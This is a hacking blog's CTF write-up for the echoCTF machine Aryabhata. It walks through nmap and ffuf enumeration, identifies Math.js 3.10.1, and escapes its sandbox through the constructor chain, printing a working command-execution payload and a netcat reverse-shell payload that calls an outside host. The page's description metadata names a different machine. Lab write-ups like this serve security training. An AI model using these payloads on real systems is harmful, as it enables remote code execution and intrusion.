<!doctype html><html lang=en><head><title>echoCTF Aryabhata Writeup: From Server Site Expression Injection to root :: Hacking Blog</title>
<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Step-by-step guide to cracking Badwidth on echoCTF with Command Injection. Perfect for OSCP prep!"><meta name=keywords content="CTF,hacking,cybersecurity,notes,writeups"><meta name=robots content="noodp"><link rel=canonical href=https://hack.com.cy/writeups/echoctf/aryabhata/aryabhata/><link rel=stylesheet href=https://hack.com.cy/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://hack.com.cy/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://hack.com.cy/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://hack.com.cy/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://hack.com.cy/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://hack.com.cy/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://hack.com.cy/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css><link rel=stylesheet href=https://hack.com.cy/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css><link rel=stylesheet href=https://hack.com.cy/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://hack.com.cy/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css><link rel=stylesheet href=https://hack.com.cy/css/sidebar.min.d99f1331c4dc2becb305a3d135a35844adbf5c1f39330853456f7e7f5864cb45.css><link rel=stylesheet href=https://hack.com.cy/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css><link rel=stylesheet href=https://hack.com.cy/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://hack.com.cy/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://hack.com.cy/terminal.css><link rel=stylesheet href=https://hack.com.cy/style.css><link rel="shortcut icon" href=https://hack.com.cy/favicon.png><link rel=apple-touch-icon href=https://hack.com.cy/apple-touch-icon.png><meta name=twitter:card content="summary"><meta name=twitter:site content><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="echoCTF Aryabhata Writeup: From Server Site Expression Injection to root"><meta property="og:description" content="Step-by-step guide to cracking Badwidth on echoCTF with Command Injection. Perfect for OSCP prep!"><meta property="og:url" content="https://hack.com.cy/writeups/echoctf/aryabhata/aryabhata/"><meta property="og:site_name" content="Hacking Blog"><meta property="og:image" content="https://hack.com.cy/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="CTF"><meta property="article:section" content="OSCP Prep"><meta property="article:section" content="echoCTF"><meta property="article:published_time" content="2025-06-03 00:00:00 +0000 UTC"><meta name=theme-color content="#0a0e14"><meta name=color-scheme content="dark"><link rel=preload href=/fonts/FiraCode-Latin.woff2 as=font type=font/woff2 crossorigin><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><script src=https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js></script><script defer src=https://hack.com.cy/js/search.js></script></head><body><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/why/><div class=logo><img src=/logo.png alt="Hacking Vault" class=logo-image></div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li><li><button class=search-button onclick=showSearch() aria-label=Search>Search</button></li></ul></nav></header><div class=content><nav class=breadcrumbs aria-label=Breadcrumb><ol class=breadcrumb-list><li class=breadcrumb-item><a href=https://hack.com.cy/ class=breadcrumb-link><span class=breadcrumb-icon>~</span>Home</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/ class=breadcrumb-link>echoCTF Writeups</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/echoctf/ class=breadcrumb-link>echoCTF Writeups</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/echoctf/aryabhata/ class=breadcrumb-link></a></li><li class=breadcrumb-separator>/</li><li class="breadcrumb-item breadcrumb-current" aria-current=page><span class=breadcrumb-text>echoCTF Aryabhata Writeup: From Server Site Expression Injection to root</span></li></ol></nav><style>.breadcrumbs{margin:20px 0 30px;padding:10px 15px;background:var(--background-secondary);border-left:3px solid var(--accent);border-right:1px solid var(--code-border);border-top:1px solid var(--code-border);border-bottom:1px solid var(--code-border)}.breadcrumb-list{display:flex;flex-wrap:wrap;align-items:center;list-style:none;margin:0;padding:0;gap:8px;font-size:.9rem}.breadcrumb-item{display:inline-flex;align-items:center}.breadcrumb-link{color:var(--accent-secondary);text-decoration:none;transition:all .2s ease;display:inline-flex;align-items:center;gap:5px}.breadcrumb-link:hover{color:var(--accent);text-shadow:0 0 5px var(--glow-accent)}.breadcrumb-icon{color:var(--accent);font-weight:700}.breadcrumb-separator{color:var(--code-border);user-select:none}.breadcrumb-current .breadcrumb-text{color:var(--foreground);font-weight:700}@media(max-width:684px){.breadcrumbs{font-size:.85rem;overflow-x:auto}.breadcrumb-list{flex-wrap:nowrap}}</style><article class=post><h1 class=post-title><a href=https://hack.com.cy/writeups/echoctf/aryabhata/aryabhata/>echoCTF Aryabhata Writeup: From Server Site Expression Injection to root</a></h1><div class=post-meta><time class=post-date>2025-06-03&nbsp;[Updated 2026-01-01]</time><span class=post-reading-time>3 min read (600 words)</span></div><span class=post-tags>#<a href=https://hack.com.cy/tags/ssei/>SSEI</a>&nbsp;
#<a href=https://hack.com.cy/tags/node/>Node</a>&nbsp;
#<a href=https://hack.com.cy/tags/express/>Express</a>&nbsp;</span><div class=table-of-contents><h2>Contents</h2><nav id=TableOfContents><ul><li><a href=#nmap>NMAP</a></li><li><a href=#nmap-output>NMAP OUTPUT</a></li></ul></nav></div><div class=post-content><div><p>Start by port scanning the target machine.</p><h1 id=enumeration>Enumeration<a href=#enumeration class=hanchor arialabel=Anchor>#</a></h1><h2 id=nmap>NMAP<a href=#nmap class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -nvv -p- 10.0.50.0 -T4 -A -oA nmap/writeup
</span></span></code></pre></div><h2 id=nmap-output>NMAP OUTPUT<a href=#nmap-output class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PORT     STATE SERVICE REASON         VERSION
</span></span><span class=line><span class=cl>80/tcp   open  http    syn-ack ttl <span class=m>63</span> nginx 1.10.3
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: nginx/1.10.3
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Welcome to Aryabhata
</span></span><span class=line><span class=cl>9229/tcp open  http    syn-ack ttl <span class=m>63</span> nginx 1.10.3
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: nginx/1.10.3
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: <span class=m>502</span> Bad Gateway
</span></span></code></pre></div><p>NMAP results show us that there are 2 nginx webserver running on ports <code>80</code> and <code>9229</code>
Port <code>80</code> return a web application which has calculation functionality while port <code>9229</code> gives us back a <code>502 Bad Gateway</code></p><h1 id=exploitation>Exploitation<a href=#exploitation class=hanchor arialabel=Anchor>#</a></h1><p>The web application has a functionality were we can do various math calculations and the result is being reflected back to us.</p><p><img src=/images/ara-1.png alt="Image Description"></p><p>Looking at the source code there is comment that gives us a hint, however i did not find it useful at all. We can also see the logic when the &ldquo;Calculate&rdquo; button is clicked. It seems that our input is sent to an endpoint <code>/got_maths/maths</code> via POST</p><p><img src=/images/ara-2.png alt="Image Description"></p><p>Lets try to break the application by injecting various weird characters and see if we can figure out what technology is running behind, even though the description tell us that this is nodejs.</p><p><img src=/images/ara-3.png alt="Image Description"></p><p>By utilizing <code>ffuf</code> and a wordlist with special characters we can analyze the request length and see if anything stands out.</p><p>To do this using <code>ffuf</code> we have to copy the POST request towards <code>/got_maths/maths</code> from burp and save it locally. Then modified the file and add the word <code>FUZZ</code> at the location we want to FUZZ in this case is <code>equation=FUZZ</code></p><p><img src=/images/ara-4.png alt="Image Description">
We can now use <code>ffuf</code> and a wordlist with special symbols from <a href=https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/special-chars%20%2B%20urlencoded.txt>seclists</a></p><p>Adding the <code>-x</code> flag allows us to see our requests through burp in order to make our attack is going as expected.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ffuf -X POST -request req.txt -request-proto <span class=s2>&#34;http&#34;</span> -w /usr/share/wordlists/seclists/Fuzzing/special-chars<span class=se>\ </span>+<span class=se>\ </span>urlencoded.txt -x http://127.0.0.1:8080
</span></span></code></pre></div><p>Filtering by <code>length</code> 1 of the special characters sticks out but I was not able anything out of it.</p><p><img src=/images/ara-5.png alt="Image Description"></p><p>We could also try brute-forcing the input with different kind of words just to see how the application responds. We going to use a small wordlist for this.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ffuf -X POST -request req.txt -request-proto <span class=s2>&#34;http&#34;</span> -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x http://127.0.0.1:8080
</span></span></code></pre></div><p>Again filtering by length we see interesting results.</p><p><img src=/images/ara-6.png alt="Image Description"></p><p>It seems that some of the words we brute-force are something like variables for the web application. By just copy and pasting the output of the word <code>help</code> in google we can identify the technology running on the background.</p><p><img src=/images/ara-7.png alt="Image Description"></p><p><img src=/images/ara-8.png alt="Image Description"></p><p>So it seems the web application is utilizing something called <code>Math.js</code>. Following the link it seems we can get all of its documentation.</p><p><img src=/images/ara-9.png alt="Image Description"></p><p>Using the word <code>version</code> we can get its version</p><p><img src=/images/ara-10.png alt="Image Description"></p><p>Searching online for exploits, vulnerabilities or PoC about <code>Math.js version 3.10.1</code> we can see some interesting results.</p><p><img src=/images/ara-11.png alt="Image Description"></p><p>Reading through various resources I knew that I was close to the solution but i could not figure out what to do next or how to approach it. So i decided to use AI rather than viewing the solution from a writeup.</p><p>It figured out that we are sandboxed within the Math.js environment and we had to escape.</p><p>Probing the environment with harmless “constructor chain” touches:</p><ul><li><p><code>[]</code> → array literal</p></li><li><p><code>[].constructor</code> → the Array constructor</p></li><li><p><code>[].constructor.constructor</code> → the <strong><code>Function</code></strong> constructor</p></li></ul><p>The responses confirm we’re evaluating inside math.js and can still <strong>reach <code>Function</code></strong> via the prototype chain. That’s the key: if we can call <code>new Function("…")</code>, we can run arbitrary JS despite the math “sandbox”.</p><p><img src=/images/ara-13.png alt="Image Description"></p><p><img src=/images/ara-14.png alt="Image Description"></p><p>Now that we accessed <code>Function</code>, we built this payload:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>equation</span><span class=o>=[]</span>.constructor.constructor<span class=o>(</span><span class=s2>&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;).toString()&#34;</span><span class=o>)()</span>
</span></span></code></pre></div><p>And we have command execution as root!</p><p><img src=/images/ara-15.png alt="Image Description"></p><p>Lets get a reverse shell</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[]</span>.constructor.constructor<span class=o>(</span><span class=s2>&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;nc 10.10.11.150 80 -e /bin/bash&#39;).toString()&#34;</span><span class=o>)()</span>
</span></span></code></pre></div><p><img src=/images/ara-16.png alt="Image Description"></p><p>ROOT!</p></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2026 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script><div id=search-overlay><div class=search-container><input type=search id=search-input placeholder="Search writeups, notes, and more..." autocomplete=off aria-label=Search><div class=search-hint>Press <kbd>ESC</kbd> to close or <kbd>/</kbd> to open search</div><div id=search-results></div></div><button class=search-close onclick=hideSearch() aria-label="Close search">×</button></div></div></body></html>